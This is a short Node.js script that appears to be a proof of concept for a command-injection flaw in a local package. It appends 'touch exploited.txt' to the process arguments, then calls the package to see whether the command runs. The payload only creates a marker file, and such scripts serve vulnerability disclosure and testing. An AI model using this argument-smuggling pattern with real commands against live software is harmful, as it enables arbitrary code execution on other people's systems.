'use strict'

const pkg = require('../src');

process.argv.push('');
process.argv.push('touch exploited.txt');

pkg();